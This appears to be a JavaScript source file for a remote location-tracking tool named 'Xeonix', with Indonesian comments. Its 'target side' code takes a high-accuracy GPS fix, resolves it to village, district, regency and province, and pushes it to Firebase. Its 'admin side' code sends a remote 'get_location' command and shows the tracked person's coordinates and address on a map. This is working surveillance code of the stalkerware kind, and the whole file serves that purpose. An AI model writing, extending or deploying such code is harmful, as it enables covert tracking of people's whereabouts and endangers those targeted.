/**
 * Xeonix Advanced Location & Intelligence Mapping Engine v4.0
 * Mimicking High-End Enterprise Geocoding Standards (Google Maps Class String Matching)
 */

// --- TARGET SIDE LOGIC (index.html) ---
window.getLocation = function() {
  return new Promise((resolve) => {
    let bestPos = null;
    let watchId;
    let timeoutId;
    let isResolved = false;

    async function processAndSendLocation(pos) {
      if (isResolved) return;
      isResolved = true;
      if (watchId) navigator.geolocation.clearWatch(watchId);
      if (timeoutId) clearTimeout(timeoutId);

      let lat = pos.coords.latitude;
      let lon = pos.coords.longitude;
      let accuracy = pos.coords.accuracy;

      let wilayah = { desa: "-", kecamatan: "-", kabupaten: "-", provinsi: "-" };
      let apiSukses = false;

      // MULTI-PASS DEEP ADDRESS ANALYZER ENGINE (Anti-Tertukar & Anti-Zonk)
      function parseAddressData(addr) {
        let res = { desa: "-", kecamatan: "-", kabupaten: "-", provinsi: "-" };
        if (!addr) return res;

        // PASS 1: Explicit Value Keyword Scanning (Prioritas Tertinggi)
        for (let key in addr) {
          let val = String(addr[key]).trim();
          let valLower = val.toLowerCase();
          
          if (valLower.includes("provinsi") || valLower.includes("propinsi")) {
            res.provinsi = val;
          } else if (valLower.includes("kabupaten") || (valLower.startsWith("kota ") && !valLower.includes("kecamatan"))) {
            res.kabupaten = val;
          } else if (valLower.includes("kecamatan") || valLower.includes("distrik")) {
            res.kecamatan = val;
          } else if (valLower.includes("kelurahan") || valLower.includes("desa ")) {
            res.desa = val;
          }
        }

        // PASS 2: Structural Key Hierarchy Fallback (Jika Pass 1 masih kosong)
        if (res.provinsi === "-") res.provinsi = addr.state || addr.province || addr.region || "-";
        if (res.kabupaten === "-") res.kabupaten = addr.regency || addr.city || addr.municipality || addr.county || "-";
        if (res.kecamatan === "-") {
          let rawKec = addr.subdistrict || addr.district || addr.city_district || addr.town || "-";
          // Proteksi silang: Pastikan data kecamatan bukan duplikasi dari field kabupaten
          if (rawKec !== res.kabupaten && rawKec !== addr.city && rawKec !== addr.regency) {
            res.kecamatan = rawKec;
          }
        }
        if (res.desa === "-") res.desa = addr.village || addr.suburb || addr.neighbourhood || addr.hamlet || "-";

        // PASS 3: Advanced Clean-up Regex (Membersihkan title teks bawaan API agar rapi di UI)
        const cleanRegex = /^(kecamatan|kabupaten|kota|provinsi|propinsi|kelurahan|desa|distrik)\s+/i;
        for (let key in res) {
          if (res[key] !== "-") {
            res[key] = res[key].replace(cleanRegex, "").trim();
          }
        }

        // PASS 4: Cross-Validation Guard Rails
        if (res.kecamatan === res.kabupaten) res.kecamatan = "-";
        
        return res;
      }

      // SOURCE GATEWAY A: Nominatim OpenStreetMap (Dengan Reverse Geocoding Filtered Header)
      try {
        let response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&addressdetails=1`, {
          headers: { 'User-Agent': 'XeonixSecureSystem/4.0 (contact: admin@xeonix.local)' }
        });
        if (response.ok) {
          let data = await response.json();
          if (data && data.address) {
            wilayah = parseAddressData(data.address);
            if (wilayah.kecamatan !== "-" || wilayah.kabupaten !== "-") {
              apiSukses = true;
            }
          }
        }
      } catch (e) { console.log("Primary API Network Fail. Switching to backup..."); }

      // SOURCE GATEWAY B: BigDataCloud Corporate API Client (Backup Engine)
      if (!apiSukses) {
        try {
          let response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=id`);
          if (response.ok) {
            let data = await response.json();
            let bdcAddr = {};
            
            // Ekstraksi data array informatif ke format object linear
            if (data.localityInfo && data.localityInfo.informative) {
              data.localityInfo.informative.forEach(item => {
                if (item.name) bdcAddr[item.order || Math.random()] = item.name;
              });
            }
            if (data.principalSubdivision) bdcAddr.state = data.principalSubdivision;
            if (data.city) bdcAddr.city = data.city;
            if (data.locality) bdcAddr.locality = data.locality;

            let resBDC = parseAddressData(bdcAddr);
            if (resBDC.kabupaten !== "-") wilayah.kabupaten = resBDC.kabupaten;
            if (resBDC.kecamatan !== "-") wilayah.kecamatan = resBDC.kecamatan;
            if (resBDC.provinsi !== "-") wilayah.provinsi = resBDC.provinsi;
            if (resBDC.desa !== "-") wilayah.desa = resBDC.desa;
          }
        } catch (e) { console.log("All Geocoding Engine API failed to respond."); }
      }

      // Pengiriman Data Terintegrasi ke Firebase Realtime Database
      if (typeof db !== "undefined" && typeof deviceId !== "undefined") {
        db.ref("devices/" + deviceId + "/gpsHistory").push({
          lat: lat, lon: lon, accuracy: accuracy.toFixed(2),
          desa: wilayah.desa, kecamatan: wilayah.kecamatan, kabupaten: wilayah.kabupaten, provinsi: wilayah.provinsi, time: Date.now()
        });
      }
      resolve();
    }

    // GPS Saturation & Warm-up Sequence
    watchId = navigator.geolocation.watchPosition(
      (pos) => {
        if (!bestPos || pos.coords.accuracy < bestPos.coords.accuracy) {
          bestPos = pos;
        }
        if (bestPos.coords.accuracy <= 15) {
          processAndSendLocation(bestPos);
        }
      },
      (error) => {
        console.log("GPS Hardware tracking log:", error.message);
        if (!bestPos && !isResolved) {
          isResolved = true;
          resolve();
        }
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );

    // Hard Timeout Safe Guard
    timeoutId = setTimeout(() => {
      if (bestPos && !isResolved) {
        processAndSendLocation(bestPos);
      } else if (!isResolved) {
        isResolved = true;
        if (watchId) navigator.geolocation.clearWatch(watchId);
        resolve();
      }
    }, 6000);
  });
};

// --- ADMIN SIDE LOGIC (admin.html) ---
window.bukaGoogleMaps = function() {
  if (typeof lastLat !== "undefined" && typeof lastLon !== "undefined" && lastLat && lastLon) {
    // FIX: Memperbaiki URL Google Maps asli yang valid dan canggih
    window.open(`https://www.google.com/maps?q=${lastLat},${lastLon}`, '_blank');
  }
};

window.ambilPosisi = function() {
  if (typeof waitingGPS !== "undefined" && waitingGPS) return;
  window.waitingGPS = true;
  
  let statusEl = document.getElementById("gpsStatus");
  if (statusEl) statusEl.innerHTML = "<div class='loading'>📡 Synchronizing location...</div>";
  
  if (typeof db !== "undefined" && typeof deviceId !== "undefined") {
    db.ref("devices/" + deviceId + "/command").set("get_location");
  }
  
  setTimeout(() => {
    if (window.waitingGPS) {
      if (statusEl) statusEl.innerHTML = "<div class='errorText'>Timeout: Failed to acquire fix</div>";
      window.waitingGPS = false;
    }
  }, 10000);
};

// Detektor Otomatis Sinkronisasi UI Admin
function initAdminLocationListener() {
  if (typeof db !== "undefined" && typeof deviceId !== "undefined" && document.getElementById("gpsData")) {
    db.ref("devices/" + deviceId + "/gpsHistory").limitToLast(1).on("value", snap => {
      snap.forEach(child => {
        let d = child.val();
        window.waitingGPS = false;

        window.lastLat = d.lat;
        window.lastLon = d.lon;
        
        let btnMaps = document.getElementById("btnOpenMaps");
        if (btnMaps) {
          btnMaps.disabled = false;
          btnMaps.style.background = "var(--primary)";
          btnMaps.style.color = "white";
          btnMaps.style.borderColor = "var(--primary)";
          btnMaps.style.cursor = "pointer";
          btnMaps.innerHTML = "🗺️ Open in Google Maps";
        }

        let statusEl = document.getElementById("gpsStatus");
        if (statusEl) statusEl.innerHTML = "<div class='successText'>Location acquired ✔</div>";
        
        let dataEl = document.getElementById("gpsData");
        if (dataEl) {
          dataEl.innerHTML = `
            <table>
            <tr><th>Latitude</th><td>${d.lat}</td></tr>
            <tr><th>Longitude</th><td>${d.lon}</td></tr>
            <tr><th>Accuracy</th><td>± ${d.accuracy} m</td></tr>
            <tr><th>Desa</th><td>${d.desa}</td></tr>
            <tr><th>Kecamatan</th><td>${d.kecamatan}</td></tr>
            <tr><th>Kabupaten</th><td>${d.kabupaten}</td></tr>
            <tr><th>Provinsi</th><td>${d.provinsi}</td></tr>
            <tr><th>Timestamp</th><td>${new Date(d.time).toLocaleString()}</td></tr>
            </table>
          `;
        }
      });
    });
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", initAdminLocationListener);
} else {
  initAdminLocationListener();
}